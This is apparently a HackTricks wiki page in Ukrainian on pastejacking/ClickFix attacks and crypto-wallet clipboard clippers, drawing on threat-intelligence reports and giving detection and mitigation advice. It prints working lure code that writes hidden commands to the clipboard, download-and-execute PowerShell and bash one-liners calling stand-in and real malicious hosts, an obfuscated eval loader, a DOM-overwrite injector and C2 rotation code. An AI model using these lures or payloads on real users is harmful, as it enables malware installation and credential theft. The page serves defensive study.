# Атаки з перехопленням буфера обміну (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> «Ніколи не вставляйте те, що скопіювали не ви». — стара, але досі слушна порада

## Огляд

Перехоплення буфера обміну — також відоме як *pastejacking* — використовує той факт, що користувачі регулярно копіюють і вставляють команди, не перевіряючи їх. Шкідлива вебсторінка (або будь-яке середовище, що підтримує JavaScript, як-от застосунок Electron чи Desktop) програмно розміщує контрольований зловмисником текст у системному буфері обміну. Жертв заохочують, зазвичай за допомогою ретельно розроблених інструкцій соціальної інженерії, натиснути **Win + R** (діалогове вікно Run), **Win + X** (Quick Access / PowerShell) або відкрити термінал і *вставити* вміст буфера обміну, негайно виконавши довільні команди.

Оскільки **жоден файл не завантажується і жодне вкладення не відкривається**, ця техніка обходить більшість засобів безпеки електронної пошти та вебвмісту, які відстежують вкладення, макроси або безпосереднє виконання команд. Тому цей метод популярний у фішингових кампаніях, що поширюють поширені сімейства шкідливого ПЗ, як-от NetSupport RAT, завантажувач Latrodectus або Lumma Stealer.<sup>[[1]](#references)</sup>

## Кліпери для підміни адрес гаманців

Інший варіант **перехоплення буфера обміну** не вставляє команди: він чекає, поки жертва скопіює **адресу криптовалютного гаманця**, а потім непомітно замінює її адресою зловмисника безпосередньо перед вставленням. Це особливо ефективно для довгих форматів адрес гаманців, оскільки користувачі часто перевіряють лише перші й останні символи.<sup>[[8]](#references)</sup>

Поширені ознаки таких атак у реальному світі:
- **Легкий завантажувач + вкладене корисне навантаження**: видимий застосунок/файл exe виглядає як легітимний інструмент для торгівлі чи отримання «прибутку», тоді як справжній кліпер приховано глибше в пакеті (наприклад, завантажувач .NET запускає вкладене корисне навантаження Rust).
- **Заміна на основі regex**: шкідливе ПЗ зіставляє рядки на кшталт `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` або навіть типові рядки **довжиною 44 символи, схожі на адреси Solana**, і замінює їх на адреси гаманців зловмисника.
- **Масштабна ротація адрес гаманців**: сучасні зразки для Windows можуть містити **тисячі** адрес для заміни на кожну валюту замість однієї статичної адреси, зменшуючи втрату репутації гаманця після кожної крадіжки.<sup>[[8]](#references)</sup>

### Схема роботи кліпера у Windows

Поширена реалізація — це приховане вікно, зареєстроване за допомогою **`AddClipboardFormatListener`**. Після кожного оновлення буфера обміну шкідливе ПЗ зазвичай викликає:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → отримання доступу до поточних даних буфера обміну.
- **`GetClipboardData`** → читання тексту.
- **`EmptyClipboard`** + **`SetClipboardData`** → заміна рядка адреси гаманця значенням зловмисника.

Мінімальні regex для пошуку, які часто трапляються у кліперах:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

User-level persistence достатньо для впливу. Один із помічених шаблонів:<sup>[[8]](#references)</sup>
- Копіювати payload у **`%APPDATA%\silke\silke.exe`**
- Створити **LNK у папці автозапуску** в `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ідеї для виявлення:
- Процеси, які постійно викликають Clipboard API, водночас записуючи файли в `%APPDATA%` і папку **Startup** користувача.
- Створення нового LNK/виконуваного файла з подальшою підміною адреси гаманця в буфері обміну.
- Архіви або пакети фальшивого ПЗ, що містять багато невикористовуваних файлів і невеликий launcher, який запускає вкладений бінарний файл.

### Соціальна інженерія для видалення карантину в macOS + persistence через LaunchAgent

У macOS деякі кампанії поширюють допоміжний файл **`unlocker.command`** і вказують жертві клацнути правою кнопкою миші → **Open**, якщо Gatekeeper повідомляє, що програма пошкоджена або від невідомого розробника. Скрипт просто знімає мітку карантину та запускає розташований поруч файл `.app`:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Це **не** exploit Gatekeeper; це **обхід quarantine за допомогою соціальної інженерії**, який зловживає тим, що рішення Gatekeeper залежать від xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Після виконання clipper може закріпитися від імені поточного користувача, записавши:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – скрипт-обгортку
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent із параметрами `RunAtLoad` і `KeepAlive`

Важлива деталь для захисту: деякі зразки реалізують **watchdog із самовідновленням**, який приблизно кожні 30 секунд повторно записує LaunchAgent і скрипт-обгортку. Якщо спершу видалити plist, **не завершивши запущений процес**, malware може негайно створити його знову.<sup>[[8]](#references)</sup> Безпечний порядок очищення:
1. Завершити активний процес clipper.
2. Вивантажити/видалити plist LaunchAgent.
3. Видалити `~/launch.sh` і скопійований payload.

### Примітка щодо доставки: фальшива репутація як множник ефекту

Для цього сімейства malware може залишатися технічно простим, тоді як **шар розповсюдження** виконує основну роботу: фальшиві зірки/форки на GitHub, відгуки/завантаження на SourceForge, коментарі/перегляди під навчальними відео на YouTube, а також нешкідливі на вигляд коментарі/голоси на VirusTotal — усе це використовують, щоб створити враження надійності бінарного файлу перед виконанням.<sup>[[8]](#references)</sup>

## Примусове використання кнопок копіювання та приховані payloads (однорядкові команди для macOS)

Деякі infostealers для macOS клонують сайти інсталяторів (наприклад, Homebrew) і **змушують використовувати кнопку «Copy»**, щоб користувачі не могли виділити лише видимий текст. Запис у буфері обміну містить очікувану команду інсталятора та доданий Base64 payload (наприклад, `...; echo <b64> | base64 -d | sh`), тому одне вставлення виконує обидві команди, тоді як інтерфейс приховує додатковий етап.<sup>[[5]](#references)</sup>

## JavaScript: proof-of-concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Старі кампанії використовували `document.execCommand('copy')`, новіші покладаються на асинхронний **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Сценарій ClickFix / ClearFake

1. Користувач відвідує сайт із typosquatting або скомпрометований сайт (наприклад, `docusign.sa[.]com`)
2. Впроваджений JavaScript **ClearFake** викликає допоміжну функцію `unsecuredCopyToClipboard()`, яка непомітно зберігає в буфері обміну закодовану в Base64 однорядкову команду PowerShell.
3. Інструкції на HTML-сторінці вказують жертві: *«Натисніть **Win + R**, вставте команду та натисніть Enter, щоб усунути проблему».*
4. Запускається `powershell.exe`, який завантажує архів із легітимним виконуваним файлом і шкідливою DLL (класичний DLL sideloading).
5. Завантажувач розшифровує додаткові етапи, впроваджує shellcode та встановлює механізм закріплення (наприклад, scheduled task), зрештою запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Приклад ланцюжка NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (легітимний Java WebStart) шукає `msvcp140.dll` у своїй директорії.
* Шкідлива DLL динамічно отримує адреси API за допомогою **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, розшифровує їх за допомогою rolling XOR key `"https://google.com/"`, інжектує кінцевий shellcode та розпаковує **client32.exe** (NetSupport RAT) у `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Завантажує `la.txt` за допомогою **curl.exe**
2. Виконує JScript-завантажувач у **cscript.exe**
3. Завантажує MSI payload → розміщує `libcef.dll` поруч із підписаним застосунком → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer через MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Виклик **mshta** запускає прихований скрипт PowerShell, який завантажує `PartyContinued.exe`, розпаковує `Boat.pst` (CAB), відтворює `AutoIt3.exe` за допомогою `extrac32` і конкатенації файлів, а потім запускає скрипт `.a3x`, який викрадає облікові дані браузера та надсилає їх на `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Буфер обміну → PowerShell → JS eval → ярлик LNK в автозавантаженні з ротацією C2 (PureHVNC)

У деяких кампаніях ClickFix взагалі не завантажують файли, а натомість пропонують жертвам вставити однорядкову команду, яка завантажує та виконує JavaScript через WSH, забезпечує його постійне виконання й щодня змінює C2. Приклад зафіксованого ланцюжка:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Ключові ознаки
- Обфускований URL, який розвертається під час виконання, щоб ускладнити поверхневий аналіз.
- JavaScript закріплюється в системі через Startup LNK (WScript/CScript) і вибирає C2 залежно від поточного дня, що дає змогу швидко ротувати домени.<sup>[[3]](#references)</sup>

Мінімальний фрагмент JS для ротації C2 за датою:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Наступний етап зазвичай розгортає loader, який забезпечує persistence і завантажує RAT (наприклад, PureHVNC), часто закріплюючи TLS за жорстко заданим сертифікатом і розбиваючи трафік на фрагменти.<sup>[[3]](#references)</sup>

Ідеї для виявлення, специфічні для цього варіанта
- Дерево процесів: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (або `cscript.exe`).
- Артефакти автозапуску: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, що запускає WScript/CScript із шляхом до JS у `%TEMP%`/`%APPDATA%`.
- Телеметрія реєстру/RunMRU та командного рядка, що містить `.split('').reverse().join('')` або `eval(a.responseText)`.
- Повторюваний запуск `powershell -NoProfile -NonInteractive -Command -` із великими даними stdin для передавання довгих скриптів без довгих командних рядків.
- Scheduled Tasks, які згодом запускають LOLBins, наприклад `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, під виглядом завдання/шляху оновлення (наприклад, `\GoogleSystem\GoogleUpdater`).

Пошук загроз
- Щодня змінювані імена хостів C2 та URL із шаблоном `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Зіставляйте події запису в буфер обміну з подальшим вставленням через Win+R і негайним запуском `powershell.exe`.

Команди захисту можуть поєднувати телеметрію буфера обміну, створення процесів і реєстру, щоб виявляти зловживання pastejacking:

* Реєстр Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію команд **Win + R** — шукайте підозрілі записи Base64 / обфусковані записи.
* Подія безпеки ID **4688** (створення процесу), де `ParentImage` == `explorer.exe`, а `NewProcessName` належить до { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Подія ID **4663** про створення файлів у `%LocalAppData%\Microsoft\Windows\WinX\` або тимчасових папках безпосередньо перед підозрілою подією 4688.
* Сенсори EDR для буфера обміну (якщо доступні) — зіставляйте `Clipboard Write` із негайним запуском нового процесу PowerShell.

## Сторінки перевірки в стилі IUAM (ClickFix Generator): копіювання з буфера обміну в консоль + payload-и з урахуванням ОС

У нещодавніх кампаніях масово створюють підроблені сторінки перевірки CDN/браузера («Зачекайте…», у стилі IUAM), які змушують користувачів копіювати специфічні для ОС команди з буфера обміну в системні консолі. Це переносить виконання за межі пісочниці браузера і працює у Windows та macOS.<sup>[[4]](#references)</sup>

Ключові ознаки сторінок, створених builder-ом
- Визначення ОС через `navigator.userAgent` для адаптації payload-ів (Windows PowerShell/CMD або macOS Terminal). За бажанням — decoy-елементи/no-op для непідтримуваних ОС, щоб зберегти ілюзію.
- Автоматичне копіювання в буфер обміну під час нешкідливих дій в інтерфейсі (прапорець/Copy), хоча видимий текст може відрізнятися від вмісту буфера обміну.
- Блокування мобільних пристроїв і спливне вікно з покроковими інструкціями: Windows → Win+R→вставити→Enter; macOS → відкрити Terminal→вставити→Enter.
- Необов’язкова обфускація та injector в одному файлі для перезапису DOM скомпрометованого сайту інтерфейсом перевірки зі стилями Tailwind (реєструвати новий домен не потрібно).<sup>[[4]](#references)</sup>

Приклад: невідповідність буфера обміну + розгалуження з урахуванням ОС
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

Збереження виконання початкового запуску в macOS
- Використовуйте `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, щоб виконання тривало після закриття термінала, зменшуючи кількість помітних артефактів.<sup>[[4]](#references)</sup>

Перехоплення сторінки безпосередньо на скомпрометованих сайтах
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Ідеї для виявлення та пошуку загроз, специфічні для IUAM-приманок
- Web: сторінки, які прив’язують Clipboard API до віджетів верифікації; невідповідність між відображуваним текстом і вмістом буфера обміну; розгалуження за `navigator.userAgent`; Tailwind + заміна вмісту односторінкового застосунку в підозрілих контекстах.
- Кінцеві точки Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` невдовзі після взаємодії з браузером; запуск batch/MSI-інсталяторів із `%TEMP%`.
- Кінцеві точки macOS: Terminal/iTerm запускає `bash`/`curl`/`base64 -d` з `nohup` поблизу подій у браузері; фонові завдання продовжують працювати після закриття термінала.
- Зіставляйте історію Win+R у `RunMRU` та записи в буфер обміну з подальшим створенням процесів консолі.

Див. також допоміжні техніки

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Еволюція фальшивих CAPTCHA / ClickFix у 2026 році (ClearFake, Scarlet Goldfinch)

- ClearFake продовжує компрометувати сайти на WordPress і впроваджувати JavaScript-завантажувач, який пов’язує зовнішні хости (Cloudflare Workers, GitHub/jsDelivr) і навіть виклики блокчейн-“etherhiding” (наприклад, POST-запити до API-ендпоїнтів Binance Smart Chain, як-от `bsc-testnet.drpc[.]org`), щоб отримувати актуальну логіку приманки. У нещодавніх накладках активно використовуються фальшиві CAPTCHA, які пропонують користувачам скопіювати й вставити однорядкову команду (T1204.004), а не завантажувати щось.<sup>[[6]](#references)</sup>
- Початкове виконання дедалі частіше передається підписаним хостам скриптів/LOLBAS. У ланцюжках атак за січень 2026 року попереднє використання `mshta` замінили на вбудований `SyncAppvPublishingServer.vbs`, який запускається через `WScript.exe` з аргументами, схожими на PowerShell-команди, з псевдонімами/символами підстановки для отримання віддаленого вмісту:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` має цифровий підпис і зазвичай використовується App-V; у поєднанні з `WScript.exe` та незвичними аргументами (аліаси `gal`/`gcm`, cmdlet-и з wildcard-символами, URL-адреси jsDelivr) він стає високосигнальним етапом LOLBAS для ClearFake.<sup>[[6]](#references)</sup>
- У лютому 2026 року payload-и фальшивих CAPTCHA знову перейшли на чисті PowerShell download cradles. Два активні приклади:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Перший ланцюжок — це grabber, який виконує `iex(irm ...)` у пам’яті; другий використовує `WinHttp.WinHttpRequest.5.1` для завантаження, записує тимчасовий файл `.ps1`, а потім запускає його з `-ep bypass` у прихованому вікні.<sup>[[6]](#references)</sup>

Поради з виявлення та пошуку цих варіантів
- Ланцюжок процесів: браузер → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` або PowerShell cradles одразу після запису в буфер обміну чи Win+R.
- Ключові слова в командному рядку: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, домени jsDelivr/GitHub/Cloudflare Worker або шаблони `iex(irm ...)` із необробленою IP-адресою.
- Мережа: вихідні з’єднання з CDN worker-хостами або blockchain RPC endpoints від скриптових хостів/PowerShell невдовзі після перегляду вебсторінок.
- Файли/реєстр: створення тимчасового `.ps1` у `%TEMP%` разом із записами RunMRU, що містять ці однорядкові команди; блокуйте або сповіщайте про запуск signed-script LOLBAS (WScript/cscript/mshta) із зовнішніми URL-адресами або обфускованими рядками псевдонімів.

## Тактики ClickFix у червні 2026 року: телеметрія вставлення, фальшиві коментарі перевірки та ланцюжки LOLBin

Нещодавня телеметрія Red Canary свідчить, що стабільним індикатором є **не одна конкретна команда**, а поєднання **вставлення й запуску за участю користувача**, **довірених інтерпретаторів/LOLBins**, **обфускованих прапорців**, **віддаленого отримання** та **негайного виконання**.<sup>[[7]](#references)</sup>

### Характерні шаблони операторів

- **Телеметрія підтвердження вставлення**: деякі payloads виконують `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` перед основним етапом. Це підтверджує взаємодію з користувачем, водночас зберігаючи коротке й непомітне вікно.
- **Фальшиві коментарі перевірки**: однорядкові команди PowerShell можуть додавати рядки на кшталт `# Security check ✔️ I'm not a robot Verification ID: 138105`, щоб після вставлення команди в Run / `cmd.exe` / історію PowerShell вона й надалі виглядала пов’язаною з CAPTCHA.
- **Динамічне відновлення URL**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` дає змогу уникнути статичної URL-адреси в командному рядку, але водночас завантажити й виконати код у пам’яті.
- **Виконання під виглядом інсталятора**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` зловживає незвичним регістром символів і схожими на Unicode символами у прапорцях, щоб обійти крихкі механізми виявлення, але водночас нагадує `msiexec.exe`.
- **Ланцюжки LOLBin з екрануванням символом каретки**: `cmd.exe` може приховувати ключові слова за допомогою екранування символом `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), запускати вкладену оболонку згорнутою, зберігати вміст атакувальника під нешкідливим розширенням, наприклад `.pdf`, а потім виконувати його через `mshta`.<sup>[[7]](#references)</sup>
## Заходи протидії

1. Посилення захисту браузера – вимкніть запис у буфер обміну (`dom.events.asyncClipboard.clipboardItem` тощо) або вимагайте жесту користувача.
2. Обізнаність із безпеки – навчайте користувачів *вводити* чутливі команди вручну або спочатку вставляти їх у текстовий редактор.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, щоб блокувати довільні однорядкові команди.
4. Мережеві засоби контролю – блокуйте вихідні запити до відомих доменів pastejacking і malware C2.

## Пов’язані трюки

* **Discord Invite Hijacking** часто використовує той самий підхід ClickFix після того, як заманює користувачів на шкідливий сервер:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Виправлення Click: запобігання вектору атаки ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC Pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – За завісою Pure: від RAT до конструктора й кодера](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Фабрика ClickFix: перше викриття генератора IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025 рік — рік Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Аналітичні дані: лютий 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Аналітичні дані: червень 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Від зірочок до голосів: фальшива репутація допомагає викрадачу криптовалюти з буфера обміну](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
